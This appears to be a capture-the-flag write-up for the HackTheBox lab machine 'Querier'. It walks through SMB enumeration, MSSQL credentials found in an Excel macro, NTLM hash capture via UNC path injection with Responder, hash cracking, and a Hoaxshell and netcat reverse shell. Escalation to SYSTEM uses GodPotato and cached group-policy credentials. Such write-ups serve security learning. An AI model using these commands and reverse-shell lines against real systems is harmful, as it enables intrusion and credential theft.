---
title: "Querier HackTheBox" 
date: 2025-12-31 21:50:00 0000+
tags: [WriteUp, Querier, HTB, Enumeration, Active Directory, SMB, Powerup, Group policy, macros, VB, UNC path injection, Responder, Bloodhound, Privilege Escalation, MSSQL, Hash Cracking, SeImpersonationPrivilege, GodPotato, Windows]
categories: [WriteUps,HackTheBox]
image:
  path: /assets/images/Querier_HTB/preview_querier.png
---
# Querier HackTheBox

`Querier` is a medium difficulty box from `HackTheBox` which is based on Active Directory well not exactly AD but we need not contact the domain controller for this box. Exploitation goes like, first we find an open share which is world readable after getting a file present on the share we discovered that the file contains a macros which is exposing the credentials of an `MSSQL server`, we get on the server and through a `UNC path injection` we were able to get the `NetNTLMv2` hash of the `MSSQL service account` through which got access to the MSSQL instance from thereby enabling the `xp_cmdshell` we get on the box and by exploiting the Impersonating` privileges we get a system’s shell.  Another approach is that we load `PowerUp.ps1` to find all the vectors of privilege escalation, there we found a `Locally cached group policy` exposing the password of the administrator’s account allowing us to root the box.

![image.png](/assets/images/Querier_HTB/image.png)

## Initial Enumeration

### Rustmap

We start off with `rustmap` to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.129.5.153
```

![image.png](/assets/images/Querier_HTB/image%201.png)

![image.png](/assets/images/Querier_HTB/image%202.png)

Looking at the results we have a numerous ports open on the box which represent that it is `Active Directory`.

We also have the domain and the hostname revealed in the scan i.e. `QUERIER.HTB.LOCAL` and `QUERIER` be the `Domain Controller`, adding them to our `/etc/hosts` file.

Lets start with some more in depth enumeration.

### SMB Enumeration

Using `NetExec` to enumerate over SMB.

```bash
nxc smb 10.129.5.153 -u '' -p '' --shares
```

![image.png](/assets/images/Querier_HTB/image%203.png)

We have null authentication but we cant access the shares.

Lets test it with guest authentication.

```bash
nxc smb 10.129.5.153 -u 'guest' -p '' --shares
```

![image.png](/assets/images/Querier_HTB/image%204.png)

Also we cant enumerate these with guest also.

But we can do this with `SMBCLIENT` somehow.

```bash
smbclient -L //10.129.5.153/
```

![image.png](/assets/images/Querier_HTB/image%205.png)

So we now have `Reports` as the share, lets try to connect to it using smbclient.

```bash
smbclient //querier.htb.local/Reports
```

![image.png](/assets/images/Querier_HTB/image%206.png)

We can connect to the share which is world readable and there is only one file present so downloading it.

## Exploitation

### Discovery of Macros

Opening the `.xlsm` file in `LibreOffice` we have a `macros` present on the document, inspecting it.

![image.png](/assets/images/Querier_HTB/image%207.png)

Reveals us this `VBProject` script which is making a connection to `MSSQL` running on the box and extracting the data from the table volume.

The connection Scipt is as follows

```vb
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
```

This script contains a user id and a password to make a connection to the remote database.

### MSSQL Exploitation

Lets now connect to the remote database using the credentials found.

We will be using `mssqlclient.py` from impacket to connect to the target.

```bash
mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.129.5.153 -dc-ip 10.129.5.153 -windows-auth
```

![image.png](/assets/images/Querier_HTB/image%208.png)

We are in !

Lets try to enable **`xp_cmdshell`**

![image.png](/assets/images/Querier_HTB/image%209.png)

As reporting we dont have permissions to do so.

But if we do `xp_dirtree` 

![image.png](/assets/images/Querier_HTB/image%2010.png)

We were able to list out the files in the present directory.

We exploit this using the `UNC path injection`.

Starting `Responder` to listen for connection recieved from the MSSQL server.

```bash
responder -I tun0
```

![image.png](/assets/images/Querier_HTB/image%2011.png)

In the MSSQL instance we inject this

```bash
xp_dirtree \\10.10.14.64\share\nothing
```

![image.png](/assets/images/Querier_HTB/image%2012.png)

![image.png](/assets/images/Querier_HTB/image%2013.png)

Successfully captured the NetNTLMv2 hash of the `mssql-svc` account.

### Hash Cracking

Saving the hash for cracking.

![image.png](/assets/images/Querier_HTB/image%2014.png)

Its mode 5600 on hashcat.

Cracking it.

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Querier_HTB/image%2015.png)

We now have valid credentials of `mssql-svc` account.

### Shell as MSSQL-SVC

Now we have new credentials for the MSSQL instance, lets login with `mssql-svc`.

```bash
mssqlclient.py mssql-svc:'corporate568'@10.129.5.153 -dc-ip 10.129.5.153 -windows-auth
```

![image.png](/assets/images/Querier_HTB/image%2016.png)

Now we can enable the `xp_cmdshell` on the server.

![image.png](/assets/images/Querier_HTB/image%2017.png)

So lets use a powershell reverse shell with `xp_cmdshell` to get a shell on the box.

I will use `Hoaxshell` to craft me a payload for the reverse shell.

```bash
python3 /opt/hoaxshell/hoaxshell.py -s 10.10.14.64 -p 9090
```

![image.png](/assets/images/Querier_HTB/image%2018.png)

Pasting this payload with `xp_cmdshell`

![image.png](/assets/images/Querier_HTB/image%2019.png)

We now have a shell on the box as `MSSQL-SVC` user.

Claiming the user.txt in the `MSSQL-SVC’s` user directory.

![image.png](/assets/images/Querier_HTB/image%2020.png)

## Privilege Escalation

### SeImpersonationPrivilege (Method 1)

As `MSSQL-SVC` we have `SeImpersonatePrivilege` enabled, since this is service account and mostly for service accounts this privilege is ofter enabled cause of the workflow.

![image.png](/assets/images/Querier_HTB/image%2021.png)

We can now use `GodPotato.exe` a kernel exploit binary to escalate our privileges.

Here’s the link to its github repository.

[https://github.com/BeichenDream/GodPotato/releases](https://github.com/BeichenDream/GodPotato/releases)

I already have a compiled binary, tranferring it to the box using curl.

![image.png](/assets/images/Querier_HTB/image%2022.png)

We also need the `nc.exe` to get a privileged shell so transfering the `nc.exe` too.

![image.png](/assets/images/Querier_HTB/image%2023.png)

Now executing `GodPotato` and `nc`

```bash
.\gp.exe -cmd "./nc64.exe -t -e c:\windows\system32\cmd.exe 10.10.14.87 9005"
```

![image.png](/assets/images/Querier_HTB/image%2024.png)

We are `NT AUTHORITY\SYSTEM`.

![image.png](/assets/images/Querier_HTB/image%2025.png)

We can go ahead and claim the root flag.

### Group Policy Preferences (Method 2)

Another way of exploiting this box’s privilege escalation part is we use `PowerUp.ps1` A script designed to find the possible privilege escalation on windows machines, heavily signatured by the `Windows Defender` and other Aniviruses.

Uploading `PowerUp.ps1` to the remote box where we have shell as `MSSQL-SVC` 

![image.png](/assets/images/Querier_HTB/image%2026.png)

Loaded the `PowerUp.ps1` into the memory.

Now if we run `Invoke-AllChecks` from `PowerUp` we get all the vectors to escalate our privileges.

![image.png](/assets/images/Querier_HTB/image%2027.png)

We have Administrator’s credentials stored in the `Locally cached group policy preferences`.

With that password we can use `Wmiexec.py` to login as Administrator.

```bash
wmiexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.129.5.153
```

![image.png](/assets/images/Querier_HTB/image%2028.png)

Rooted !

![image.png](/assets/images/Querier_HTB/image%2029.png)

Thanks for Reading 🙂